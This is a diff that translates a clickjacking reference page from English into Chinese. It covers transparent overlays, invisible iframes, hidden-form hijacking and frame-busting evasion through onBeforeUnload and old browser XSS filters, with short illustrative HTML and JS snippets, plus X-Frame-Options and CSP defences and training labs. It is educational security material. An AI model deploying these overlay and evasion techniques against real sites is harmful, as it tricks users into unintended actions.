@@ -1,95 +1,97 @@
-# Clickjacking
+[原文文档](README.en.md)
 
-> Clickjacking is a type of web security vulnerability where a malicious website tricks a user into clicking on something different from what the user perceives, potentially causing the user to perform unintended actions without their knowledge or consent. Users are tricked into performing all sorts of unintended actions as such as typing in the password, clicking on ‘Delete my account' button, liking a post, deleting a post, commenting on a blog. In other words all the actions that a normal user can do on a legitimate website can be done using clickjacking.
+# 点击劫持
 
-## Summary
+> 点击劫持是一种Web安全漏洞，恶意网站诱使用户点击与其感知不同的东西，可能导致用户在其不知情或未同意的情况下执行意外操作。用户被欺骗执行各种意外操作，例如在密码框中输入、点击"删除我的账户"按钮、点赞帖子、删除帖子、在博客上评论。换句话说，正规网站上的所有正常用户可以执行的操作都可以通过点击劫持来完成。
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [UI Redressing](#ui-redressing)
-    * [Invisible Frames](#invisible-frames)
-    * [Button/Form Hijacking](#buttonform-hijacking)
-    * [Execution Methods](#execution-methods)
-* [Preventive Measures](#preventive-measures)
-    * [Implement X-Frame-Options Header](#implement-x-frame-options-header)
-    * [Content Security Policy (CSP)](#content-security-policy-csp)
-    * [Disabling JavaScript](#disabling-javascript)
-* [OnBeforeUnload Event](#onbeforeunload-event)
-* [XSS Filter](#xss-filter)
-    * [IE8 XSS filter](#ie8-xss-filter)
-    * [Chrome 4.0 XSSAuditor filter](#chrome-40-xssauditor-filter)
-* [Challenge](#challenge)
-* [Labs](#labs)
-* [References](#references)
+## 摘要
 
-## Tools
+* [工具](#工具)
+* [方法论](#方法论)
+    * [UI重绘](#ui重绘)
+    * [隐形框架](#隐形框架)
+    * [按钮/表单劫持](#按钮表单劫持)
+    * [执行方法](#执行方法)
+* [防护措施](#防护措施)
+    * [实现X-Frame-Options头部](#实现x-frame-options头部)
+    * [内容安全策略(CSP)](#内容安全策略csp)
+    * [禁用JavaScript](#禁用javascript)
+* [OnBeforeUnload事件](#onbeforeunload事件)
+* [XSS过滤器](#xss过滤器)
+    * [IE8 XSS过滤器](#ie8-xss过滤器)
+    * [Chrome 4.0 XSSAuditor过滤器](#chrome-40-xssauditor过滤器)
+* [挑战](#挑战)
+* [实验室](#实验室)
+* [参考资料](#参考资料)
+
+## 工具
 
 * [portswigger/burp](https://portswigger.net/burp)
 * [zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)
 * [machine1337/clickjack](https://github.com/machine1337/clickjack)
 
-## Methodology
+## 方法论
 
-### UI Redressing
+### UI重绘
 
-UI Redressing is a Clickjacking technique where an attacker overlays a transparent UI element on top of a legitimate website or application.
-The transparent UI element contains malicious content or actions that are visually hidden from the user. By manipulating the transparency and positioning of elements,
-the attacker can trick the user into interacting with the hidden content, believing they are interacting with the visible interface.
+UI重绘是一种点击劫持技术，攻击者在合法网站或应用程序之上覆盖透明UI元素。
+透明UI元素包含对用户视觉隐藏的恶意内容或操作。通过操纵元素的透明度和定位，
+攻击者可以诱使用户与隐藏内容交互，相信他们正在与可见界面交互。
 
-* **How UI Redressing Works:**
-    * Overlaying Transparent Element: The attacker creates a transparent HTML element (usually a `<div>`) that covers the entire visible area of a legitimate website. This element is made transparent using CSS properties like `opacity: 0;`.
-    * Positioning and Layering: By setting the CSS properties such as `position: absolute; top: 0; left: 0;`, the transparent element is positioned to cover the entire viewport. Since it's transparent, the user doesn't see it.
-    * Misleading User Interaction: The attacker places deceptive elements within the transparent container, such as fake buttons, links, or forms. These elements perform actions when clicked, but the user is unaware of their presence due to the overlaying transparent UI element.
-    * User Interaction: When the user interacts with the visible interface, they are unknowingly interacting with the hidden elements due to the transparent overlay. This interaction can lead to unintended actions or unauthorized operations.
+* **UI重绘的工作原理：**
+    * 覆盖透明元素：攻击者创建一个覆盖合法网站整个可见区域的透明HTML元素（通常是`<div>`）。此元素使用CSS属性如`opacity: 0;`变为透明。
+    * 定位和分层：通过设置CSS属性如`position: absolute; top: 0; left: 0;`，透明元素被定位为覆盖整个视口。由于它是透明的，用户看不到它。
+    * 误导用户交互：攻击者在透明容器内放置欺骗性元素，如假按钮、链接或表单。这些元素在点击时执行操作，但由于覆盖的透明UI元素，用户不知道它们的存在。
+    * 用户交互：当用户与可见界面交互时，由于透明覆盖，他们不知不觉地与隐藏元素交互。这种交互可能导致意外操作或未经授权的操作。
 
 ```html
 <div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
-  <a href="malicious-link">Click me</a>
+  <a href="malicious-link">点击我</a>
 </div>
 ```
 
-### Invisible Frames
+### 隐形框架
 
-Invisible Frames is a Clickjacking technique where attackers use hidden iframes to trick users into interacting with content from another website unknowingly.
-These iframes are made invisible by setting their dimensions to zero (height: 0; width: 0;) and removing their borders (border: none;).
-The content inside these invisible frames can be malicious, such as phishing forms, malware downloads, or any other harmful actions.
+隐形框架是一种点击劫持技术，攻击者使用隐藏iframe欺骗用户不知不觉地与来自另一个网站的内容交互。
+这些iframe通过将它们的尺寸设置为零（height: 0; width: 0;）并移除它们的边框（border: none;）而变为隐形。
+这些隐形框架内的内容可能是恶意的，如网络钓鱼表单、恶意软件下载或任何其他有害操作。
 
-* **How Invisible Frames Work:**
-    * Hidden IFrame Creation: The attacker includes an `<iframe>` element in a webpage, setting its dimensions to zero and removing its border, making it invisible to the user.
+* **隐形框架的工作原理：**
+    * 隐藏IFrame创建：攻击者在网页中包含一个`<iframe>`元素，将其尺寸设置为零并移除其边框，使其对用户不可见。
 
       ```html
       <iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
       ```
 
-    * Loading Malicious Content: The src attribute of the iframe points to a malicious website or resource controlled by the attacker. This content is loaded silently without the user's knowledge because the iframe is invisible.
-    * User Interaction: The attacker overlays enticing elements on top of the invisible iframe, making it seem like the user is interacting with the visible interface. For instance, the attacker might position a transparent button over the invisible iframe. When the user clicks the button, they are essentially clicking on the hidden content within the iframe.
-    * Unintended Actions: Since the user is unaware of the invisible iframe, their interactions can lead to unintended actions, such as submitting forms, clicking on malicious links, or even performing financial transactions without their consent.
+    * 加载恶意内容：iframe的src属性指向攻击者控制的恶意网站或资源。由于iframe是隐形，内容在没有用户知情的情况下静默加载。
+    * 用户交互：攻击者在隐形iframe之上覆盖诱人的元素，使用户看起来在与可见界面交互。例如，攻击者可能在隐形iframe之上定位一个透明按钮。当用户点击按钮时，他们实际上是在点击iframe内的隐藏内容。
+    * 意外操作：由于用户不知道隐形iframe，它们的交互可能导致意外操作，如提交表单、点击恶意链接，甚至在未经同意的情况下执行财务交易。
 
-### Button/Form Hijacking
+### 按钮/表单劫持
 
-Button/Form Hijacking is a Clickjacking technique where attackers trick users into interacting with invisible or hidden buttons/forms, leading to unintended actions on a legitimate website. By overlaying deceptive elements on top of visible buttons or forms, attackers can manipulate user interactions to perform malicious actions without the user's knowledge.
+按钮/表单劫持是一种点击劫持技术，攻击者欺骗用户与隐形或隐藏按钮/表单交互，导致在合法网站上发生意外操作。通过在可见按钮或表单之上覆盖欺骗元素，攻击者可以操纵用户交互来执行恶意操作，而用户毫不知情。
 
-* **How Button/Form Hijacking Works:**
-    * Visible Interface: The attacker presents a visible button or form to the user, encouraging them to click or interact with it.
+* **按钮/表单劫持的工作原理：**
+    * 可见界面：攻击者向用户显示可见按钮或表单，鼓励他们点击或与之交互。
 
     ```html
-    <button onclick="submitForm()">Click me</button>
+    <button onclick="submitForm()">点击我</button>
     ```
 
-    * Invisible Overlay: The attacker overlays this visible button or form with an invisible or transparent element that contains a malicious action, such as submitting a hidden form.
+    * 隐形覆盖：攻击者用包含恶意操作的隐形或透明元素覆盖这个可见按钮或表单，如提交隐藏表单。
 
     ```html
     <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
-    <!-- Hidden form fields -->
+    <!-- 隐藏表单字段 -->
     </form>
     ```
 
-    * Deceptive Interaction: When the user clicks the visible button, they are unknowingly interacting with the hidden form due to the invisible overlay. The form is submitted, potentially causing unauthorized actions or data leakage.
+    * 欺骗交互：当用户点击可见按钮时，由于隐形覆盖，他们不知不觉地与隐藏表单交互。表单被提交，可能导致未经授权的操作或数据泄露。
 
     ```html
-    <button onclick="submitForm()">Click me</button>
+    <button onclick="submitForm()">点击我</button>
     <form action="legitimate-site" method="POST" id="hidden-form">
-      <!-- Hidden form fields -->
+      <!-- 隐藏表单字段 -->
     </form>
     <script>
       function submitForm() {
@@ -98,9 +100,9 @@ Button/Form Hijacking is a Clickjacking technique where attackers trick users in
     </script>
     ```
 
-### Execution Methods
+### 执行方法
 
-* Creating Hidden Form: The attacker creates a hidden form containing malicious input fields, targeting a vulnerable action on the victim's website. This form remains invisible to the user.
+* 创建隐藏表单：攻击者创建包含恶意输入字段的隐藏表单，目标是受害者网站上的易受攻击的操作。此表单对用户保持隐形。
 
 ```html
   <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
@@ -109,7 +111,7 @@ Button/Form Hijacking is a Clickjacking technique where attackers trick users in
   </form>
 ```
 
-* Overlaying Visible Element: The attacker overlays a visible element (button or form) on their malicious page, encouraging users to interact with it. When the user clicks the visible element, they unknowingly trigger the hidden form's submission.
+* 覆盖可见元素：攻击者在他们的恶意页面上覆盖可见元素（按钮或表单），鼓励用户与之交互。当用户点击可见元素时，他们不知不觉地触发隐藏表单的提交。
 
 ```js
   function submitForm() {
@@ -117,62 +119,62 @@ Button/Form Hijacking is a Clickjacking technique where attackers trick users in
   }
 ```
 
-## Preventive Measures
+## 防护措施
 
-### Implement X-Frame-Options Header
+### 实现X-Frame-Options头部
 
-Implement the X-Frame-Options header with the DENY or SAMEORIGIN directive to prevent your website from being embedded within an iframe without your consent.
+使用DENY或SAMEORIGIN指令实现X-Frame-Options头部，防止您的网站在未经您同意的情况下被嵌入iframe内。
 
 ```apache
 Header always append X-Frame-Options SAMEORIGIN
 ```
 
-### Content Security Policy (CSP)
+### 内容安全策略(CSP)
 
-Use CSP to control the sources from which content can be loaded on your website, including scripts, styles, and frames.
-Define a strong CSP policy to prevent unauthorized framing and loading of external resources.
-Example in HTML meta tag:
+使用CSP控制可以从哪些源在您的网站上加载内容，包括脚本、样式和框架。
+定义强CSP策略以防止未经授权的框架化和外部资源加载。
+HTML meta标签中的示例：
 
 ```html
 <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
 ```
 
-### Disabling JavaScript
+### 禁用JavaScript
 
-* Since these type of client side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.
-* There are three deactivation techniques that can be used with frames:
-    * Restricted frames with Internet Explorer: Starting from IE6, a frame can have the "security" attribute that, if it is set to the value "restricted", ensures that JavaScript code, ActiveX controls, and re-directs to other sites do not work in the frame.
+* 由于这些类型的客户端保护依赖于JavaScript框架破坏代码，如果受害者禁用JavaScript或攻击者能够禁用JavaScript代码，网页将没有针对点击劫持的任何保护机制。
+* 有三种可用于框架的停用技术：
+    * Internet Explorer的受限框架：从IE6开始，框架可以有"security"属性，如果设置为"restricted"值，确保JavaScript代码、ActiveX控件和重定向到其他站点在框架中不起作用。
 
     ```html
     <iframe src="http://target site" security="restricted"></iframe>
     ```
 
-    * Sandbox attribute: with HTML5 there is a new attribute called “sandbox”. It enables a set of restrictions on content loaded into the iframe. At this moment this attribute is only compatible with Chrome and Safari.
+    * Sandbox属性：使用HTML5，有一个称为"sandbox"的新属性。它可以对加载到iframe中的内容启用一组限制。目前此属性仅与Chrome和Safari兼容。
 
     ```html
     <iframe src="http://target site" sandbox></iframe>
     ```
 
-## OnBeforeUnload Event
+## OnBeforeUnload事件
 
-* The `onBeforeUnload` event could be used to evade frame busting code. This event is called when the frame busting code wants to destroy the iframe by loading the URL in the whole web page and not only in the iframe. The handler function returns a string that is prompted to the user asking confirm if he wants to leave the page. When this string is displayed to the user is likely to cancel the navigation, defeating target's frame busting attempt.
+* `onBeforeUnload`事件可用于规避框架破坏代码。当框架破坏代码想要通过在整页而不是仅在iframe中加载URL来销毁iframe时，调用此事件。处理程序函数返回一个字符串，提示用户询问是否确认要离开页面。当此字符串显示给用户时，很可能取消导航，击败目标的框架破坏尝试。
 
-* The attacker can use this attack by registering an unload event on the top page using the following example code:
+* 攻击者可以使用以下示例代码在顶部页面注册卸载事件来使用此攻击：
 
 ```html
 <h1>www.fictitious.site</h1>
 <script>
     window.onbeforeunload = function()
     {
-        return " Do you want to leave fictitious.site?";
+        return " 您要离开fictitious.site吗?";
     }
 </script>
 <iframe src="http://target site">
 ```
 
-* The previous technique requires the user interaction but, the same result, can be achieved without prompting the user. To do this the attacker have to automatically cancel the incoming navigation request in an onBeforeUnload event handler by repeatedly submitting (for example every millisecond) a navigation request to a web page that responds with a _"HTTP/1.1 204 No Content"_ header.
+* 前面的技术需要用户交互，但可以在不提示用户的情况下达到相同结果。为此，攻击者必须在onBeforeUnload事件处理程序中自动取消传入的导航请求，方法是一遍又一遍地提交（例如每毫秒一次）导航请求到响应为_"HTTP/1.1 204 No Content"_头部的网页。
 
-204 page:
+204页面：
 
 ```php
 <?php
@@ -180,7 +182,7 @@ Example in HTML meta tag:
 ?>
 ```
 
-Attacker's Page:
+攻击者页面：
 
 ```js
 <script>
@@ -199,11 +201,11 @@ Attacker's Page:
 <iframe src="http://target site">
 ```
 
-## XSS Filter
+## XSS过滤器
 
-### IE8 XSS filter
+### IE8 XSS过滤器
 
-This filter has visibility into all parameters of each request and response flowing through the web browser and it compares them to a set of regular expressions in order to look for reflected XSS attempts. When the filter identifies a possible XSS attacks; it disables all inline scripts within the page, including frame busting scripts (the same thing could be done with external scripts). For this reason an attacker could induce a false positive by inserting the beginning of the frame busting script into a request's parameters.
+此过滤器对流经Web浏览器的每个请求和响应的所有参数都有可见性，并将它们与一组正则表达式进行比较，以查找反射的XSS尝试。当过滤器识别出可能的XSS攻击时；它禁用页面内的所有内联脚本，包括框架破坏脚本（外部脚本也可以做同样的事情）。因此，攻击者可以通过在请求参数中插入框架破坏脚本的开头来诱导假阳性。
 
 ```html
 <script>
@@ -214,43 +216,43 @@ This filter has visibility into all parameters of each request and response flow
 </script>
 ```
 
-Attacker View:
+攻击者视图：
 
 ```html
-<iframe src=”http://target site/?param=<script>if”>
+<iframe src="http://target site/?param=<script>if">
 ```
 
-### Chrome 4.0 XSSAuditor filter
+### Chrome 4.0 XSSAuditor过滤器
 
-It has a little different behaviour compared to IE8 XSS filter, in fact with this filter an attacker could deactivate a “script” by passing its code in a request parameter. This enables the framing page to specifically target a single snippet containing the frame busting code, leaving all the other codes intact.
+与IE8 XSS过滤器相比，它的行为略有不同，实际上使用此过滤器，攻击者可以通过在请求参数中传递其代码来停用"script"。这使框架页面能够专门针对包含框架破坏代码的单个片段，而让所有其他代码保持完好。
 
-Attacker View:
+攻击者视图：
 
 ```html
-<iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>
+<iframe src="http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D">
 ```
 
-## Challenge
+## 挑战
 
-Inspect the following code:
+检查以下代码：
 
 ```html
 <div style="position: absolute; opacity: 0;">
   <iframe src="https://legitimate-site.com/login" width="500" height="500"></iframe>
 </div>
-<button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';">Click me</button>
+<button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';">点击我</button>
 ```
 
-Determine the Clickjacking vulnerability within this code snippet. Identify how the hidden iframe is being used to exploit the user's actions when they click the button, leading them to a malicious website.
+确定此代码片段中的点击劫持漏洞。识别隐藏的iframe如何用于利用用户点击按钮时的操作，将他们引导至恶意网站。
 
-## Labs
+## 实验室
 
 * [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
-* [OWASP Client Side Clickjacking Test](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking)
+* [OWASP客户端点击劫持测试](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking)
 
-## References
+## 参考资料
 
-* [Clickjacker.io - Saurabh Banawar - May 10, 2020](https://clickjacker.io)
-* [Clickjacking - Gustav Rydstedt - April 28, 2020](https://owasp.org/www-community/attacks/Clickjacking)
-* [Synopsys Clickjacking - BlackDuck - November 29, 2019](https://www.synopsys.com/glossary/what-is-clickjacking.html#B)
-* [Web-Security Clickjacking - PortSwigger - October 12, 2019](https://portswigger.net/web-security/clickjacking)
+* [Clickjacker.io - Saurabh Banawar - 2020年5月10日](https://clickjacker.io)
+* [点击劫持 - Gustav Rydstedt - 2020年4月28日](https://owasp.org/www-community/attacks/Clickjacking)
+* [Synopsys点击劫持 - BlackDuck - 2019年11月29日](https://www.synopsys.com/glossary/what-is-clickjacking.html#B)
+* [Web-Security点击劫持 - PortSwigger - 2019年10月12日](https://portswigger.net/web-security/clickjacking)
